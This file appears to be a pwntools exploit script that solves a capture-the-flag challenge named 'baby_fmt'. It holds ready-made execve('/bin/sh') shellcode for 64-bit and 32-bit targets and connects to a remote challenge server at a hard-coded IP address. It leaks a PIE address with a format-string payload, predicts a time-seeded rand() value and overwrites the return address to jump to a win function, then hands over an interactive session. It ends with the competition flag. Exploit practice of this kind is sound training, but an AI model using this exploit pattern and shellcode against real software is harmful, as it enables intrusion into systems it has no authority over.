#!/usr/bin/env python

from ctypes import *
from pwn import *
import sys
import time
import argparse
import string

# ============================================================== #
# ========================== SETTINGS ========================== #
# ============================================================== #

context.arch = 'amd64' # [ amd64 | i386 ]
context.os = 'linux'
context.endian = 'little'
context.word_size = 64 # [ 64 | 32]
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
context.log_level = 'INFO'
context.terminal = ['tmux','splitw','-h']

# ============================================================== #
# ========================== TEMPLATE ========================== #
# ============================================================== #


SHELLCODE64 = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" # 27bytes len
SHELLCODE32 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" # 23bytes len
WORD32 = 'A'*4    # 32bit
WORD64 = 'X'*8   # 64bit
payload = ''
data = ''

program_name = './baby_fmt'
binary = ELF(program_name)

remote_server = '104.248.42.88'
PORT = 2001

parser = argparse.ArgumentParser(description='Exploit the bins.')
parser.add_argument('--dbg'   , '-d', action="store_true")
parser.add_argument('--remote', '-r', action="store_true")
parser.add_argument('--lib', '-l', action="store_true")
args = parser.parse_args()

if args.remote:
    caca = 1

else:
    # know libc
    if args.lib:
        libc = ELF("libc.so.6") #determin libc-version: ldd ./program_name
        p = process(program_name, env={'LD_PRELOAD' : libc.path})
    # don't know libc
    else:
        caca2 = 1

if args.dbg:
    gdb.attach(p, '''
    vmmap
    b *main
    ''')

# ============================================================== #
# ====================== USEFUL FUNCTIONS ====================== #
# ============================================================== #

# sl = p.sendline
# sla = p.sendlineafter
# sa = p.sendafter
# s = p.send

def get_symbols(y):
    x = p32(binary.symbols[y])
    return x
    # Example: read_got = p32(binary.symbols["read"])

def get_libc_offset(x):
    off = libc.symbols[x]
    return off

def search_binsh():
    return libc.search("/bin/sh").next()

# ============================================================== #
# ====================== FLOW OF PROGRAM ======================= #
# ============================================================== #

if __name__ == "__main__":

    adjust = 0
    while 1:
        p = remote(remote_server, PORT)
        # p = process(program_name)

        libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6") # ./libc6_2.31-0ubuntu7_amd64.so 
        libc.srand(libc.time(0)+14)
        haha = libc.rand()
        print '>>',hex(haha)
        win = 0x0000133b

        # gdb.attach(p)

        payload = '%13$p|'
        p.sendline(payload)

        p.recvuntil('this?\n')
        pie_leak = p.recvuntil('|').replace('|','').strip()
        pie_leak = int(pie_leak,16)-0x14db
        print '>>',hex(pie_leak)

        print 'going to:',hex(pie_leak+win)
        payload2 = cyclic(5) + p64(haha) + cyclic(16) + p64(win+pie_leak)*13
        p.recvuntil(' Chalcatongo?')
        p.sendline(payload2)

       
        p.interactive()
        p.close()


    # ============ GDB =========== #


# ============================================================== #
# =========================== SKETCH =========================== #
# ============================================================== #
# ECSC{57b5ea29806884409d1a2d20079bd98f38c494c2df50f4c130d6fa326769e22f}
